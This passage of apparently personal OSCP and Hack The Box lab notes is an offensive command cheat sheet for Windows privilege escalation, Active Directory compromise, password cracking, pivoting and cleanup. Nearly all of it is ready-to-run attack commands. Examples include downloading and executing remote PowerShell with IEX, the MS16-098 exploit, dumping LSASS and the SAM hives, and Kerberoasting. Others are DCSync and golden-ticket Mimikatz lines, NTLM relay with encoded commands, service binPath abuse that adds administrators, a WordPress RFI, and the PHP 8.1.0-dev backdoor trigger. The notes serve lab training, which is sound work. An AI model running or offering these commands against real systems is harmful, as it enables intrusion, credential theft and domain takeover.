# Capture the exact OS, architecture, patch list, and processor count first.
systeminfo

# Load Sherlock and invoke its function in the same PowerShell process.
IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/Sherlock.ps1')

Find-AllVulns
```

```powershell
# Run the reviewed MS16-098 binary from the clean callback shell.
(New-Object Net.WebClient).DownloadFile('http://$LocalIP:$TransferPort/bfill.exe', 'C:\Users\$Username\Desktop\bfill.exe')

C:\Users\$Username\Desktop\bfill.exe cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Users\$Username\Desktop\system-shell.ps1

whoami
```

> [!warning] 💡 One-CPU gotcha
> Sherlock can report MS16-032 as appearing vulnerable, but its exploit checks the processor count and exits on a single-CPU host. Read `systeminfo` before choosing that route. Optimum used MS16-098, CVE-2016-3309, from a clean native callback instead.

See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] and [[COMMAND APPENDIX/Windows Privilege Escalation|Windows privilege escalation]].

### Windows escalation branches: policy, tokens, services and credentials

```powershell
# AppLocker rules and local-account descriptions.
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

Get-AppLockerPolicy -Effective -Xml | Out-File "$env:TEMP\applocker.xml"

Get-LocalUser | Select-Object Name,Enabled,Description,LastLogon

# Token and named-pipe checks.
whoami /priv

whoami /groups

accesschk.exe -accepteula -w \\pipe\* -v

# SeImpersonate/SeAssignPrimaryToken: use the tool matching the OS and architecture.
.\PrintSpoofer64.exe -i -c cmd.exe

.\SigmaPotato.exe "cmd /c whoami"

# SeDebugPrivilege: dump LSASS only from an authorised elevated context.
procdump.exe -accepteula -ma lsass.exe "$env:TEMP\lsass.dmp"
```

```cmd
:: SeLoadDriverPrivilege / Print Operators path.
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys

ExploitCapcom.exe

:: Service and Server Operators path.
sc.exe qc $ServiceName

sc.exe config $ServiceName binPath= "cmd.exe /c net localgroup Administrators $Username /add"

sc.exe start $ServiceName

net localgroup Administrators

:: Event Log Readers: find command-line credentials in process-creation events.
net localgroup "Event Log Readers"

wevtutil qe Security /rd:true /f:text /q:"*[System[EventID=4688]]" | findstr /i "/pass password cmdkey net use"

:: Offline local hive extraction after obtaining the required rights.
reg save HKLM\SAM C:\Windows\Temp\SAM /y

reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM /y

reg save HKLM\SECURITY C:\Windows\Temp\SECURITY /y
```

```bash
# Parse exported hives on Kali.
impacket-secretsdump -sam "$BoxDir/loot/SAM" \
  -system "$BoxDir/loot/SYSTEM" \
  -security "$BoxDir/loot/SECURITY" LOCAL

# Search Windows-specific stores after copying them to private loot.
grep -RniE 'password|passwd|secret|token' "$BoxDir/loot/windows-files" 2>/dev/null

python3 cookieextractor.py --dbpath cookies.sqlite --host "$Domain"

python3 mremoteng_decrypt.py -s "$MRemoteBlob"
```

> [!warning] 💡 Windows escalation gotcha
> A privilege may appear as `Disabled` or a group membership may require a fresh logon token. Capture `whoami /all`, verify architecture and service identity, and re-authenticate after membership or policy changes.

## 12. ACTIVE DIRECTORY

```bash
# LDAP and domain discovery
ldapsearch -x -H ldap://$BoxIP -b "dc=$Domain"

ldapsearch -x -H ldap://$BoxIP -s base namingcontexts

kerbrute userenum -d $Domain --dc $BoxIP $Userlist

impacket-GetNPUsers $Domain/ -usersfile $Userlist -format john

impacket-GetUserSPNs $Domain/$Username:$Password -request

# Kerberoast and crack a captured TGS-REP ticket offline
GetUserSPNs.py $Domain/$Username:$Password -dc-ip $DCip -request -outputfile $BoxDir/loot/kerberoast.txt

hashcat -m 13100 $BoxDir/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt --potfile-path $BoxDir/loot/hashcat.potfile

# BloodHound collection
bloodhound-python -d $Domain -u $Username -p $Password -ns $BoxIP -c all

# SMB checks and pass the hash
netexec smb $BoxIP -u $Username -p $Password --shares

smbclient //$BoxIP/C$ -U "$Username2%$Password2" -c "get Users/Administrator/Desktop/root.txt $BoxDir/loot/root.txt"

impacket-psexec -hashes $LMHash:$NTHash $Username@$BoxIP

evil-winrm -i $BoxIP -u $Username -p $Password
```

```powershell
Get-NetDomain

Get-NetDomainController

Get-DomainUser | select samaccountname,lastlogon

Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Get-DomainUser -SPN | select samaccountname,serviceprincipalname

Get-DomainTrustMapping

Find-DomainShare -CheckShareAccess
```

```powershell
# Check stored Windows autologon credentials
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword

# PowerShell equivalent of dir /a
Get-ChildItem -Force
```

```bash
# Compare anonymous RPC and LDAP user enumeration
rpcclient -U '' -N $BoxIP -c 'enumdomusers'

ldapsearch -x -H ldap://$BoxIP -b "DC=htb,DC=local" '(&(objectCategory=person)(objectClass=user))' sAMAccountName

windapsearch -d $Domain --dc-ip $BoxIP -U

# AS-REP roast and crack
impacket-GetNPUsers $Domain/ -dc-ip $BoxIP -usersfile $Userlist -no-pass -request -format hashcat -outputfile $LootDir/asrep.txt

hashcat -m 18200 $LootDir/asrep.txt $Wordlist

# Anonymous LDAP RootDSE and user enumeration
ldapsearch -x -H ldap://$BoxIP -s base namingContexts defaultNamingContext dnsHostName

ldapsearch -x -H ldap://$BoxIP -b "DC=$Domain" '(|(objectClass=user)(objectClass=computer))' sAMAccountName userPrincipalName description

# Tomcat HTML Manager upload when manager-script is unavailable
JSESSION=$(grep -o 'jsessionid=[A-F0-9]*' $BoxDir/loot/tomcat-manager.html | head -1 | cut -d= -f2)

CSRF=$(grep -o 'CSRF_NONCE=[A-F0-9]*' $BoxDir/loot/tomcat-manager.html | head -1 | cut -d= -f2)

curl -s -u "$Username:$Password" -b "JSESSIONID=$JSESSION" \
  -F "deployWar=@$BoxDir/exploits/$BoxName.war;type=application/octet-stream" \
  "http://$BoxIP:$WebPort/manager/html/upload;jsessionid=$JSESSION?org.apache.catalina.filters.CSRF_NONCE=$CSRF"

# Export and parse local SAM, SYSTEM, and SECURITY hives
reg save HKLM\SAM C:\Temp\SAM /y

reg save HKLM\SYSTEM C:\Temp\SYSTEM /y

reg save HKLM\SECURITY C:\Temp\SECURITY /y

secretsdump.py -sam $BoxDir/loot/SAM -system $BoxDir/loot/SYSTEM -security $BoxDir/loot/SECURITY LOCAL

# Resource-Based Constrained Delegation and S4U ticket
bloodyAD -u $Username -p $Password -d $Domain --host $BoxIP add rbcd $TargetComputer $MachineAccount

getST.py -spn "cifs/$FQDN" -impersonate $AdminUser -dc-ip $BoxIP "$Domain/$MachineAccount" -hashes ":$NThash"

KRB5CCNAME=$BoxDir/loot/Administrator.ccache wmiexec.py -k -no-pass $FQDN
```

```bash
# Account Operators path: create a user, add it to the delegated Exchange group
netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net user $Username2 $Password2 /add /domain"

netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net group \"Exchange Windows Permissions\" $Username2 /add /domain"

# Grant DCSync rights and dump NTDS when secretsdump is unreliable
bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2

netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds

# Parse an authorized LSASS minidump offline
pypykatz lsa minidump $DumpFile

# Check an object ACL for delegated password-reset rights
dacledit.py -action read -principal $Username -target $Username2 $Domain/$Username:$Password

# Force a password reset through RPC after the ACL is confirmed
rpcclient -U "$Domain/$Username%$Password" $BoxIP -c "setuserinfo2 $Username2 23 $Password2"

# Pass the hash to a domain account
netexec smb $BoxIP -u Administrator -H $NTHash -d $Domain

evil-winrm -i $BoxIP -u Administrator -H $NTHash

# Check backup privilege state in an authenticated Windows shell
whoami /priv

# Convert a Kali-created DiskShadow script to Windows line endings
unix2dos $BoxDir/vss.dsh

# Copy protected hives from a snapshot with backup semantics
robocopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$ShadowId\Windows\NTDS $BoxDir/loot ntds.dit /b

robocopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$ShadowId\Windows\System32\config $BoxDir/loot SYSTEM /b

# Extract NT hashes locally from the matching NTDS and SYSTEM files
secretsdump.py LOCAL -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/SYSTEM -just-dc-ntlm

# Run a Windows snapshot script with the target-side DiskShadow utility
diskshadow /s:C:\\Windows\\Temp\\$ScriptName
```

```bash
# LDAP passback from an editable server address field
nc -lvnp 389

curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
```

### Active Directory PowerShell, ACLs and lateral movement

```powershell
# Domain, users, SPNs, trusts, shares, and the current user's effective rights.
Get-NetDomain

Get-NetDomainController

Get-DomainUser | Select-Object samaccountname,lastlogon,description

Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

Get-DomainTrustMapping

Find-DomainShare -CheckShareAccess

Get-DomainObjectACL -Identity "$Username2" -ResolveGUIDs

# Manual LDAPSearch fallback when PowerView is unavailable.
$Root = New-Object DirectoryServices.DirectoryEntry("LDAP://$FQDN")

$Searcher = New-Object DirectoryServices.DirectorySearcher($Root)

$Searcher.Filter = '(&(objectCategory=person)(objectClass=user))'

$Searcher.PropertiesToLoad.Add('samaccountname')

$Searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

# Password spray and delegated group/password changes after the ACL is confirmed.
Invoke-DomainPasswordSpray -Password "$Password" -OutFile "$env:TEMP\spray.txt"

Set-DomainUserPassword -Identity "$Username2" -AccountPassword (ConvertTo-SecureString "$Password2" -AsPlainText -Force)

Add-DomainGroupMember -Identity "Domain Admins" -Members "$Username2"

# Remote PowerShell session or CIM/DCOM process creation when WinRM is available.
$Session = New-PSSession -ComputerName "$FQDN" -Credential $Credential

Invoke-Command -Session $Session -ScriptBlock { whoami }

Invoke-Command -Session $Session -ScriptBlock { hostname }

$CimOpt = New-CimSessionOption -Protocol Dcom

$Cim = New-CimSession -ComputerName "$FQDN" -SessionOption $CimOpt -Credential $Credential

Invoke-CimMethod -CimSession $Cim -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd.exe /c whoami'}
```

```bash
# Kerberos naming and offline roasting.
impacket-GetNPUsers "$Domain/" -dc-ip "$BoxIP" -usersfile "$Userlist" -no-pass -request -format hashcat -outputfile "$BoxDir/loot/asrep.txt"

impacket-GetUserSPNs "$Domain/$Username:$Password" -dc-ip "$BoxIP" -request -outputfile "$BoxDir/loot/kerberoast.txt"

john --wordlist="$Wordlist" "$BoxDir/loot/kerberoast.txt"

# Read a gMSA password only when the current identity is authorised.
netexec ldap "$BoxIP" -u "$Username" -p "$Password" -d "$Domain" --gmsa

netexec smb "$BoxIP" -u "$GMSAAccount$" -H "$GmsaHash" -d "$Domain"

# Confirm a delegated password-reset edge, change the target password, and validate it.
dacledit.py -action read -principal "$Username" -target "$Username2" "$Domain/$Username:$Password"

bloodyAD -d "$Domain" -u "$GMSAAccount$" -H "$GmsaHash" --host "$BoxIP" set password "$Username2" "$Password2"

netexec smb "$BoxIP" -u "$Username2" -p "$Password2" -d "$Domain" -x 'whoami && hostname'

# Certificate and PSWA clues: inspect the P12, preserve the hostname, and use the P12 type explicitly.
openssl pkcs12 -in "$PfxFile" -nokeys -clcerts -passin pass:"$PfxPass" \
  | openssl x509 -noout -subject -issuer

curl -k -I --resolve "$FQDN:443:$BoxIP" "https://$FQDN/certsrv/"

curl -k --cert-type P12 --cert "$PfxFile:$PfxPass" \
  --resolve "$FQDN:443:$BoxIP" "https://$FQDN/staff/" \
  -c "$BoxDir/loot/pswa-cookies.txt" -o "$BoxDir/loot/pswa-logon.html"
```

```text
# Mimikatz ticket and hash operations from an authorised Windows session.
privilege::debug

sekurlsa::logonpasswords

sekurlsa::tickets /export

kerberos::ptt C:\path\to\ticket.kirbi

lsadump::dcsync /domain:$Domain /user:$AdminUser

kerberos::golden /user:$AdminUser /domain:$Domain /sid:$DomainSID /krbtgt:$KrbtgtHash /ptt
```

> [!warning] 💡 AD gotchas
> Kerberos needs correct DNS and time. For a PFX, use `--cert-type P12`; for PSWA, expect ASP.NET ViewState/EventValidation and session cookies, so a browser is usually the reliable interactive client. A gMSA hash is not a plaintext password and must be used with the trailing `$` account form.

### Search pattern: image clue → Kerberos → SMB profile → PFX → PSWA → gMSA

```bash
# Preserve the target hostname before Kerberos or certificate requests.
printf '%s\t%s\t%s\n' "$BoxIP" "$Domain" "$FQDN" | sudo tee -a /etc/hosts

# Validate the first recovered account and enumerate authenticated shares.
netexec ldap "$BoxIP" -u "$Username" -p "$Password" -d "$Domain"

netexec smb "$BoxIP" -u "$Username" -p "$Password" -d "$Domain" --shares

# Request and crack a service ticket after DNS resolution is working.
GetUserSPNs.py "$Domain/$Username:$Password" -dc-ip "$BoxIP" -request \
  -outputfile "$BoxDir/loot/kerberoast.txt"

john --wordlist="$Wordlist" "$BoxDir/loot/kerberoast.txt"

# Retrieve an exact redirected-profile path; wildcard mget may fail on nested paths.
smbclient "//$BoxIP/RedirectedFolders$" -U "$Domain/$Username2%$Password2" \
  -c "get \"user/Desktop/Phishing_Attempt.xlsx\" \"$BoxDir/loot/Phishing_Attempt.xlsx\""

unzip -p "$BoxDir/loot/Phishing_Attempt.xlsx" xl/sharedStrings.xml \
  | tee "$BoxDir/loot/xlsx-sharedStrings.xml"

# Crack and inspect the client certificate, then use the P12 type explicitly.
pfx2john "$BoxDir/loot/staff.pfx" > "$BoxDir/loot/staff.pfx.hash"

john --wordlist="$Wordlist" "$BoxDir/loot/staff.pfx.hash"

openssl pkcs12 -in "$BoxDir/loot/staff.pfx" -nokeys -clcerts -passin pass:"$PfxPass" \
  | openssl x509 -noout -subject -issuer
```

```powershell
# In the browser-backed PSWA session, validate identity before directory triage.
whoami

hostname

whoami /groups

whoami /priv
```

```bash
# Read the gMSA only as an authorised member, validate its hash, and use the ACL edge.
netexec ldap "$BoxIP" -u "$Username3" -p "$Password3" -d "$Domain" --gmsa

netexec smb "$BoxIP" -u "$GMSAAccount$" -H "$GmsaHash" -d "$Domain"

bloodyAD -d "$Domain" -u "$GMSAAccount$" -H "$GmsaHash" --host "$BoxIP" \
  set password "$AdminUser" "$Password4"

netexec smb "$BoxIP" -u "$AdminUser" -p "$Password4" -d "$Domain" \
  -x 'type C:\Users\Administrator\Desktop\root.txt'
```

> [!warning] 💡 Search gotchas
> The Kerberoast request failed until the short hostname/domain resolved; the nested XLSX path needed exact quoting; `curl` treated the PFX as PEM until `--cert-type P12` was supplied; and the first malformed WMI command left the local shell at a `quote>` continuation prompt.

## Fermion chain quick reference

```bash
# Validate a Windows credential and enumerate SMB shares
netexec smb $DCip -u $Username -p $Password -d $Domain --shares

# Recursively collect an authenticated share into private loot
cd $BoxDir/loot/extract

smbclient //$DCip/extract -U "$Domain/$Username%$Password" -c 'recurse ON; prompt OFF; mget *'

# Parse a matching AD database and SYSTEM hive offline
secretsdump.py LOCAL -ntds $BoxDir/loot/extract/ntds.dit -system $BoxDir/loot/extract/SYSTEM -just-dc-ntlm

# Validate the recovered Administrator NTLM hash without exposing it in notes
netexec winrm $DCip -u Administrator -H $NTHash -d $Domain -x 'whoami && hostname'
```

Fermion also reinforces two checks before escalation: inspect exported scheduled-task XML, confirm the task is registered, and query Winlogon for readable autologon values when the advertised trigger is absent.

## Vintage chain quick reference

```bash
# Kerberos-only assumed breach: obtain and validate a TGT.
getTGT.py "$Domain/$Username:$Password" -dc-ip $BoxIP

KRB5CCNAME=$BoxDir/loot/$Username.ccache \
  nxc smb $FQDN -d $Domain -k --use-kcache --kdcHost $BoxIP

# Collect AD relationships without NTLM.
KRB5CCNAME=$BoxDir/loot/$Username.ccache \
  bloodhound-python -u $Username -d $Domain -k -no-pass \
  --auth-method kerberos -ns $BoxIP -dc $FQDN -c All --zip

# Pre-created computer account and gMSA path.
getTGT.py "$Domain/$MachineAccount:$MachinePassword" -dc-ip $BoxIP

bloodyAD -d $Domain -u "$MachineAccount" -k \
  ccache=$BoxDir/loot/$MachineAccount.ccache kdc=$BoxIP \
  -H $FQDN -i $BoxIP get object "$GMSAAccount" \
  --attr msDS-ManagedPassword --raw

# Targeted SPN request after the gMSA/group change and TGT renewal.
GetUserSPNs.py "$Domain/$GMSAAccount" -k -no-pass -dc-ip $BoxIP \
  -usersfile $BoxDir/loot/spn-targets.txt \
  -outputfile $BoxDir/loot/kerberoast.hashes

# Group-based RBCD: add the controlled machine to the already trusted group.
bloodyAD -d $Domain -u $Username3 -k \
  ccache=$BoxDir/loot/$Username3.ccache kdc=$BoxIP \
  -H $FQDN -i $BoxIP add groupMember $DelegatedGroup '$MachineAccount'

getTGT.py "$Domain/$MachineAccount:$MachinePassword" -dc-ip $BoxIP

getST.py -spn "cifs/$FQDN" -impersonate $AdminUser \
  -k -no-pass -dc-ip $BoxIP "$Domain/$MachineAccount"

KRB5CCNAME=$BoxDir/loot/$AdminUser.ccache \
  wmiexec.py -k -no-pass "$Domain/$AdminUser@$FQDN" 'whoami'
```

Vintage-specific gotchas: NTLM was disabled; membership changes required fresh tickets; `GetUserSPNs.py` needed an exact target file; DPAPI needed the correct masterkey/blob mapping and `0x` prefix; and `L.Bianchi_adm` was used for the final delegated service because the built-in Administrator route returned `STATUS_LOGON_TYPE_NOT_GRANTED`. See [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]].

## 13. PASSWORD ATTACKS

```bash
# SSH, HTTP, and SMB password attacks
hydra -l $Username -P $Wordlist ssh://$BoxIP

hydra -l $Username -P $Wordlist http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"

medusa -h $BoxIP -u $Username -P $Wordlist -M ssh -t 4

netexec smb $BoxIP -u $Username -p $Password --continue-on-success

# Hash identification and cracking
hashid $Hash

john --wordlist=$Wordlist $HashFile

john --format=raw-md5 --wordlist="$Wordlist" "$BoxDir/loot/psk.hash"

boxset Password "$(john --show --format=raw-md5 "$BoxDir/loot/psk.hash" | awk -F: 'NR==1 {print $2; exit}')"

hashcat -m 1000 -a 0 $HashFile $Wordlist

hashcat -m 5600 $HashFile $Wordlist

keepass2john $File > $HashFile

unshadow /etc/passwd /etc/shadow > $HashFile

office2john $File > $HashFile

bitlocker2john -i $File > $HashFile

lazagne.exe all
```

```bash
# SSH private key passphrase
ssh2john $KeyFile > $HashFile

john --wordlist=$Wordlist $HashFile

john --show $HashFile
```

### Net-NTLM relay, PFX and Windows credential material

```bash
# Crack a protected Office, KeePass, BitLocker, SSH, or PKCS#12 container offline.
office2john "$File" > "$BoxDir/loot/office.hash"

keepass2john "$File" > "$BoxDir/loot/keepass.hash"

bitlocker2john -i "$File" > "$BoxDir/loot/bitlocker.hash"

ssh2john "$KeyFile" > "$BoxDir/loot/ssh-key.hash"

pfx2john "$PfxFile" > "$BoxDir/loot/pfx.hash"

john --wordlist="$Wordlist" "$BoxDir/loot/pfx.hash"

# Relay an intercepted SMB authentication to an in-scope target.
impacket-ntlmrelayx --no-http-server -smb2support -t "$BoxIP" \
  -c "powershell -enc $EncodedCommand"

# Capture a Net-NTLMv2 response only in an authorised, controlled test.
sudo responder -I tun0 -w -v

hashcat -m 5600 "$HashFile" "$Wordlist"

# Inspect local Windows tickets and logon material from an authorised session.
sekurlsa::logonpasswords

sekurlsa::tickets /export

kerberos::ptt "C:\\path\\to\\ticket.kirbi"
```

> [!warning] 💡 Relay and cracking gotcha
> Relay requires a useful authentication source and administrative rights on the relay target; the source and target cannot be the same host. Keep hashes and certificate passphrases in private loot, and validate cracked material against the least invasive service.

## 14. PORT FORWARDING & PIVOTING

```bash
# SSH local, dynamic SOCKS, and remote forwarding
ssh -L $Lport:127.0.0.1:$Port $Username@$BoxIP

ssh -D $Lport $Username@$BoxIP

ssh -R $Lport:127.0.0.1:$Port $Username@$BoxIP

sshuttle -r $Username@$BoxIP:$Port $Subnet/24

netsh interface portproxy add v4tov4 listenport=$Lport listenaddress=$LocalIP connectport=$Port connectaddress=$InternalIP

# Chisel reverse tunnel
./chisel server -p $Port --reverse

./chisel client $LocalIP:$Port R:$Lport:$InternalIP:$InternalPort

# Socat forward
socat TCP-LISTEN:$Lport,fork TCP:$InternalIP:$InternalPort

# Use a SOCKS proxy for internal tools
proxychains -q $Command
```

### Pivoting add-ons: Ligolo-ng, Rpivot, Dnscat2, Plink and ICMP

```bash
# Ligolo-ng: create the attacker TUN interface and start the proxy.
sudo ip tuntap add user "$(whoami)" mode tun ligolo

sudo ip link set ligolo up

./proxy -selfcert

# On the pivot, connect the agent; then use the Ligolo console to select and start it.
./agent -connect "$LocalIP:11601" -ignore-cert

# Add the internal route after confirming the pivot's interface/subnet.
sudo ip route add "$InternalSubnet/24" dev ligolo

nmap -sT -Pn -n "$InternalIP"

# Rpivot: HTTP-tunneled SOCKS4 when only web egress is available.
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

python2.7 client.py --server-ip "$LocalIP" --server-port 9999

proxychains nmap -sT -Pn -n "$InternalIP"

# Dnscat2: DNS tunnel; --no-cache prevents stale sessions.
sudo ruby dnscat2.rb --dns "host=0.0.0.0,port=53,domain=$Domain" --no-cache
```

```powershell
# Dnscat2 PowerShell client on a Windows pivot.
Import-Module .\dnscat2.ps1

Start-Dnscat2 -DNSserver $LocalIP -Domain $Domain -PreSharedSecret $DnsSecret -Exec cmd
```

```cmd
:: Plink local or dynamic forwarding from a Windows pivot.
plink.exe -ssh -N -L 127.0.0.1:$LocalPort:$InternalIP:$InternalPort $Username@$BoxIP -pw $Password

plink.exe -ssh -N -D 127.0.0.1:$LocalPort $Username@$BoxIP -pw $Password

:: Native Windows portproxy and firewall rule.
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=$LocalPort connectaddress=$InternalIP connectport=$InternalPort

netsh interface portproxy show all
```

```bash
# ptunnel-ng: static-build requirement and ICMP forwarding.
file "$BoxDir/tools/ptunnel-ng"

sudo "$BoxDir/tools/ptunnel-ng" -r "$BoxIP" -R 22

sudo "$BoxDir/tools/ptunnel-ng" -p "$BoxIP" -l 2222 -r "$BoxIP" -R 22

ssh -p 2222 "$Username@127.0.0.1"

# SOCKSOverRDP: use the pivot's RDP channel, then route internal tools through loopback.
proxychains nmap -sT -Pn -n "$InternalIP"
```

> [!warning] 💡 Pivoting gotcha
> SOCKS tools need `-sT -Pn -n`; raw SYN scans and DNS lookups commonly bypass or break the proxy. Ligolo uses a TUN route and does not need proxychains; Rpivot needs Python 2.7; ptunnel-ng needs root and a static binary; Dnscat2 is intentionally slow.

## 15. TROUBLESHOOTING & RECOVERY

Use this section when a box has been reverted, an address has changed, an old service scan hangs, a restricted shell rejects a payload, or a callback appears to fail. Fix one layer at a time: target address, route, service, command delivery, listener, then privilege.

### Changed target IP after a reset

```bash
# Set both values privately before testing the current target.
boxset OldBoxIP OLD_TARGET_IP

boxset BoxIP CURRENT_TARGET_IP

export BoxIP=CURRENT_TARGET_IP

echo "$BoxIP"

ip addr show tun0

ip route get "$BoxIP"

ping -c 1 "$BoxIP"

nc -vz -w 3 "$BoxIP" 22

# Remove only the stale SSH host-key entry for the old target.
ssh-keygen -R "$OldBoxIP"

grep -nE 'solidstate|OLD_TARGET_IP|CURRENT_TARGET_IP' /etc/hosts
```

> [!warning] 💡
> `boxset` saves the value for the box helper, while `export` changes only the current shell. Print `$BoxIP` immediately before SSH, Nmap, or an exploit if a command appears to use the wrong host.

### Slow or unreliable legacy service scans

```bash
# Preserve the interesting port list, then avoid repeating a hanging --version-all scan.
boxset OpenPorts "22,25,80,110,119,4555"

sudo nmap -Pn -n -sC -sV --version-light \
  -p"$OpenPorts" -oA "$BoxDir/nmap/services" "$BoxIP"

# Probe mail and custom ports separately with a short timeout.
for Port in 25 110 119 4555; do
  printf '\n=== TCP/%s ===\n' "$Port"
  timeout 5 nc -nv "$BoxIP" "$Port" < /dev/null
done
```

> [!tip] ⚡ Efficiency
> A version scan is a routing tool. If one legacy protocol consumes minutes, save the useful output, switch to `--version-light`, and use targeted banner probes instead of waiting for every NSE script to finish.

### Apache James and line-oriented POP3 checks

```bash
boxset JamesPort 4555

boxset POP3Port 110

nc -nv "$BoxIP" "$JamesPort"

# Enter the private administrator values at the prompts, then use:
# listusers
# setpassword $Username $Password
# quit

# POP3 is line-oriented and expects CRLF-terminated commands.
telnet "$BoxIP" "$POP3Port"

# USER $Username
# PASS $Password
# LIST
# RETR 2
# QUIT

# Non-interactive alternative, with the credential kept in private variables.
printf 'USER %s\r\nPASS %s\r\nLIST\r\nRETR 2\r\nQUIT\r\n' \
  "$Username" "$Password" \
  | timeout 10 nc -nv "$BoxIP" "$POP3Port" \
  > "$BoxDir/loot/pop3-session.txt"
```

> [!warning] 💡
> A generic Nmap label such as `rsip` does not identify the application. Read the banner on the port itself. If raw `nc` appears idle on POP3, use `telnet` or send explicit `\r\n` line endings.

### Restricted Bash or `rbash` diagnosis

```bash
# Run inside the SSH or callback shell.
echo "$SHELL"

echo "$PATH"

command -v bash sh python python3 env cat ls scp 2>/dev/null

ls -la "$HOME/bin"

cat /etc/passwd

# These probes distinguish restricted command names and redirections.
env /bin/bash -i

/usr/bin/python -c 'import os; os.system("/bin/bash")'
```

If `/dev/tcp` or absolute command names are rejected, do not keep changing the same payload. Use an application-side write primitive, an allowed transfer mechanism, or a callback generated for a confirmed target interpreter:

```bash
boxset Lport 9001

ss -ltnp | grep ":$Lport" || true

nc -lvnp "$Lport"

python3 "$BoxDir/exploits/james-50347.py" \
  "$BoxIP" "$LocalIP" "$Lport"

ssh "$Username@$BoxIP"
```

> [!tip] 🛠️ Better tool
> Use [RevShells](https://www.revshells.com/) to choose Bash, Python, PHP, or Netcat for the interpreter confirmed on the target. Use [HackTricks](https://book.hacktricks.wiki/en/index.html) for restricted-shell behaviour and [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) for delivery alternatives.

### Callback and suspended-listener checks

```bash
# Listener must be started before the exploit or login trigger.
ss -ltnp | grep -E ":$Lport|:$RootPort" || true

nc -lvnp "$Lport"

# After Ctrl+Z on a raw callback listener, recover the local terminal.
stty raw -echo; fg

export TERM=xterm

stty rows 40 columns 120

# If the local display is broken, type reset and press Enter.
reset
```

> [!warning] 💡
> A callback can fail because the target did not execute the command, the target has the wrong `$LocalIP`, the listener port is occupied, or the local terminal is suspended. Check those in that order.

### Preserve a missing or unrecorded step

```bash
# Start a fresh transcript before repeating a step that was lost during a reconnect.
htblog

printf 'Target: %s\nLocal: %s\nPort: %s\n' "$BoxIP" "$LocalIP" "$Lport"

id

whoami

hostname
```

Record the exact trigger, callback port, identity output, and cleanup path. A screenshot or loot file can prove a result, but it does not reconstruct a command that was never captured.

## 16. CLEANUP

```bash
# Remove local payloads and temporary files
rm -f /tmp/$File

rm -f $BoxDir/www/$File
```

```cmd
# Remove target-side payloads
del C:\Users\$Username\$File

del C:\Windows\Temp\$File

# Restore a writable scheduled-task script from a saved copy
copy /Y C:\Users\$Username\job-original.bat C:\Path\to\task-script.bat

fc /b C:\Users\$Username\job-original.bat C:\Path\to\task-script.bat
```

```bash
# Verify a removed webshell returns 404
curl -s -o /dev/null -w "%{http_code}" http://$BoxIP/$Path

# Remove files from an anonymous FTP upload root after confirming the exact paths
curl --ftp-pasv --user anonymous:anonymous --quote "DELE $RemoteFile" "ftp://$BoxIP/"

sudo ipsec stop 2>/dev/null || true

pkill -f "python3 -m http.server $ListenPort" 2>/dev/null || true

boxdone

md5sum $File
```

```bash
# TartarSauce: targeted WPScan plugin discovery and RFI proof
wpscan --url "http://$BoxIP/webservices/wp/" --enumerate u,vp,vt \
  --plugins-detection aggressive -o "$BoxDir/loot/wpscan-aggressive.txt"
curl -sS -G "http://$BoxIP/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php" \
  --data-urlencode "abspath=http://$LocalIP:8000/" --data-urlencode 'cmd=id'

# TartarSauce: post-foothold timer and architecture checks
sudo -l

systemctl list-timers --all

uname -m && file /bin/bash
```

### Technique-specific restore checks

```bash
# Remove only files created for this box and verify listeners are closed.
rm -f "$BoxDir/www/$File" "$BoxDir/exploits/$ExploitFile"

ss -ltnp | grep -E ":$Port|:$WebPort|:$LocalPort" || true

# Restore a modified Linux file from the preserved original and verify its hash.
cp -p "$OriginalFile" "$ModifiedFile"

sha256sum "$ModifiedFile" "$OriginalFile"

# Remove only the host-file entry added for the current target.
grep -n "$FQDN" /etc/hosts

sudo sed -i "\\|$BoxIP[[:space:]]\\+$FQDN|d" /etc/hosts
```

```cmd
:: Restore a Windows service, task, or registry value after proof.
sc.exe config $ServiceName binPath= "$OriginalBinaryPath"

schtasks /Change /TN "$TaskName" /TR "$OriginalTaskCommand"

reg.exe import C:\Windows\Temp\original.reg

:: Remove target-side payloads and confirm they are gone.
del /f C:\Windows\Temp\$File

del /f C:\Users\$Username\$File

dir C:\Windows\Temp\$File C:\Users\$Username\$File
```

```sql
-- Remove only an assessment-created database object after confirming its name.
DROP TABLE IF EXISTS cmd_exec;
```

> [!warning] 💡 Cleanup gotcha
> Do not use broad recursive deletion against a workspace or target. Restore service paths, task commands, registry values, group membership, passwords, host-file entries, and uploaded artifacts individually, then record what could not be reverted.
## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/

## 17. KNIFE: PHP 8.1.0-dev BACKDOOR AND CHEF SUDO

```bash
# Preserve the header evidence and prove the development-build backdoor safely.
curl -sSI "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/headers.txt"

curl -fsS -H 'User-Agentt: zerodiumsystem("id");' \
  "http://$BoxIP:$WebPort/" | grep -m1 'uid='

